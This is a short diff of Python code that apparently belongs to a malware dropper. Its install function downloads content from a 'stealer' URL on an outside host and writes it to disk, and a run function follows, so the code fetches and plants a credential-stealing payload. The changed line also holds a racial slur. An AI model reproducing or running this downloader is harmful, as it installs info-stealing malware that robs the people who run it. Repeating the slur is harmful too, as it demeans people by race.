@@ -23,7 +23,7 @@ def getName():
     return firstName+choice(lasName)
 def install(path):
     with open(path,mode='w',encoding='utf-8')as f:
-        r=request.urlopen('http://fade.one/stealer/FADEE-H04IKA-PQBJXE-U3DFLG-C9QWXQ-KNBCSN').read().decode('utf8')
+        r=request.urlopen('http://fade.one/stealer/FADEE-1234 Nigga').read().decode('utf8')
         print(r)
         f.write(r)
 def run(path):
